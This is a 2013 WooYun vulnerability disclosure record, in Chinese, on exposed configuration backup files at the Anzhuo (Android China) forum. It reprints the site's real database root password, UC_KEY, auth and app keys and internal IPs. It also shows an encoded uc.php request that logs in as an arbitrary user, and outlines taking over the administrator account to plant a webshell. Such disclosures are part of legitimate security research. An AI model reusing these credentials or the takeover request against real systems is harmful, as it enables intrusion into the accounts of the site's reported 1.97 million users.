{"id": 6987, "wybug_id": "wooyun-2013-043375", "wybug_title": "敏感信息泄露#安卓中国敏感信息泄露导致197万用户信息危急", "wybug_corp": "安卓中国", "wybug_author": "贱心", "wybug_date": "2013-11-19 18:23", "wybug_open_date": "2014-01-03 18:23", "wybug_type": "重要敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-19：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-01-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 敏感信息泄露#安卓中国敏感信息泄露导致197万用户信息危急 详细说明：  http://bbs.anzhuo.cn/config/config_ucenter.php.bakhttp://bbs.anzhuo.cn/config/config_global.php.bak\n<?phpdefine('UC_CONNECT', 'mysql');define('UC_DBHOST', 'localhost');//192.168.1.40define('UC_DBUSER', 'root');define('UC_DBPW', 'anzhuo');define('UC_DBNAME', 'anzhuotest');//anzhuouucenterdefine('UC_DBCHARSET', 'gbk');define('UC_DBTABLEPRE', '`anzhuotest`.pre_ucenter_');//`anzhuouucenter`.pre_ucenter_define('UC_DBCONNECT', 0);define('UC_CHARSET', 'gbk');define('UC_KEY', 'W8d5oe47o2oa63DcT7q7AdXbO4e7m3o8J3FfV4y90fi9Y3E7Set7Y0tfn91dmeXa');define('UC_API', 'http://www.anzhuo.cn/uc_server');define('UC_APPID', '1');define('UC_IP', '127.0.0.1');define('UC_PPP', 20);\n\n<?php$_config = array();// ----------------------------  CONFIG DB  ----------------------------- //$_config['db']['1']['dbhost'] = '192.168.1.36';//192.168.1.40$_config['db']['1']['dbuser'] = 'root';$_config['db']['1']['dbpw'] = 'anzhuo';$_config['db']['1']['dbcharset'] = 'gbk';$_config['db']['1']['pconnect'] = '1';$_config['db']['1']['dbname'] = 'anzhuotest';$_config['db']['1']['tablepre'] = 'pre_';$_config['db']['common']['slave_except_table'] = '';// --------------------------  CONFIG MEMORY  --------------------------- //$_config['memory']['prefix'] = 'wvuLeb_';$_config['memory']['eaccelerator'] = 0;$_config['memory']['xcache'] = 0;$_config['memory']['memcache']['server'] = '192.168.1.36';//192.168.1.40$_config['memory']['memcache']['port'] = 11211;$_config['memory']['memcache']['pconnect'] = 1;$_config['memory']['memcache']['timeout'] = 1;$_config['memory']['apc'] = 0;// --------------------------  CONFIG SERVER  --------------------------- //$_config['server']['id'] = 1;// -------------------------  CONFIG DOWNLOAD  -------------------------- //$_config['download']['readmod'] = 2;$_config['download']['xsendfile']['type'] = '0';$_config['download']['xsendfile']['dir'] = '/down/';// ---------------------------  CONFIG CACHE  --------------------------- //$_config['cache']['type'] = 'file';// --------------------------  CONFIG OUTPUT  --------------------------- //$_config['output']['charset'] = 'gbk';$_config['output']['forceheader'] = 1;$_config['output']['gzip'] = '0';$_config['output']['tplrefresh'] = 1;$_config['output']['language'] = 'zh_cn';$_config['output']['staticurl'] = 'static/';$_config['output']['ajaxvalidate'] = '0';$_config['output']['iecompatible'] = '0';// --------------------------  CONFIG COOKIE  --------------------------- //$_config['cookie']['cookiepre'] = 'a2Lk_';$_config['cookie']['cookiedomain'] = '.anzhuo.cn';$_config['cookie']['cookiepath'] = '/';// -------------------------  CONFIG SECURITY  -------------------------- //$_config['security']['authkey'] = 'fccf381Lz76houW7';$_config['security']['urlxssdefend'] = 1;$_config['security']['attackevasive'] = '0';$_config['security']['querysafe']['status'] = 1;$_config['security']['querysafe']['dfunction']['0'] = 'load_file';$_config['security']['querysafe']['dfunction']['1'] = 'hex';$_config['security']['querysafe']['dfunction']['2'] = 'substring';$_config['security']['querysafe']['dfunction']['3'] = 'if';$_config['security']['querysafe']['dfunction']['4'] = 'ord';$_config['security']['querysafe']['dfunction']['5'] = 'char';$_config['security']['querysafe']['daction']['0'] = 'intooutfile';$_config['security']['querysafe']['daction']['1'] = 'intodumpfile';$_config['security']['querysafe']['daction']['2'] = 'unionselect';$_config['security']['querysafe']['daction']['3'] = '(select';$_config['security']['querysafe']['dnote']['0'] = '/*';$_config['security']['querysafe']['dnote']['1'] = '*/';$_config['security']['querysafe']['dnote']['2'] = '#';$_config['security']['querysafe']['dnote']['3'] = '--';$_config['security']['querysafe']['dnote']['4'] = '\"';$_config['security']['querysafe']['dlikehex'] = 1;$_config['security']['querysafe']['afullnote'] = 1;// --------------------------  CONFIG ADMINCP  -------------------------- //// -------- Founders: $_config['admincp']['founder'] = '1,2,3'; --------- //$_config['admincp']['founder'] = '1';$_config['admincp']['forcesecques'] = '0';$_config['admincp']['checkip'] = 1;$_config['admincp']['runquery'] = 1;$_config['admincp']['dbimport'] = 1;// --------------------------  CONFIG REMOTE  --------------------------- //$_config['remote']['on'] = '0';$_config['remote']['dir'] = 'remote';$_config['remote']['appkey'] = '62cf0b3c3e6a4c9468e7216839721d8e';$_config['remote']['cron'] = '0';//附件文件下载地址为：后台=》全局=》上传设置=》本地附件 URL 地址//附件图片地址$_config['attachimageurl']='http://img.3g.cn/anzhuo/data/attachment/';//apk.anzhuo.cn/data/attachment///头像显示地址$_config['avatarurl']='http://www.anzhuo.cn/uc_server/';//www.anzhuo.cn/uc_server/// -------------------  THE END  -------------------- //?>\n   漏洞证明：  没找到数据库外网ip 而且也很可能不可外连那么这里我们利用uc_key有了uc_key 我们可以直接获取getshell的参考： WooYun: 敏感信息泄露#动漫东东敏感信息泄露导致100万+用户信息可被脱裤 可惜简单的getshell方法失败，另一个getshell方法比较麻烦那我们来试试利用uc_key进任意用户账号吧文件：/api/uc.php我们利用这里的接口：synlogin代码片段：\nfunction synlogin($get, $post) {\t\tglobal $_G;\t\tif(!API_SYNLOGIN) {\t\t\treturn API_RETURN_FORBIDDEN;\t\t}\t\theader('P3P: CP=\"CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR\"');\t\t$cookietime = 31536000;\t\t$uid = intval($get['uid']);\t\tif(($member = getuserbyuid($uid, 1))) {\t\t\tdsetcookie('auth', authcode(\"$member[password]\\t$member[uid]\", 'ENCODE'), $cookietime);\t\t}\t}\n利用脚本略过利用api进入任意用户：\nhttp://bbs.anzhuo.cn/api/uc.php?code=8f76D6txUKXpTJV571iAy5BZbTUBP%2BFzouNzXVOTEe3qNDOoNnhRvBE8LT7kr0v%2BShnMQywzGTV2U2bY7By2mPHjEbyCzbJewxtJQbHDPcp9b5hZP72unXUYMFc\n\n\n\n\n还可以利用uc_key拿webshell方法：改管理员密码（本地搭建个discuz，利用uc_key修改anzhuo.cn管理员的密码） 进后台拿webshell安卓中国有197万+用户\n\n   修复方案：  null   版权声明：转载请注明来源 贱心@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}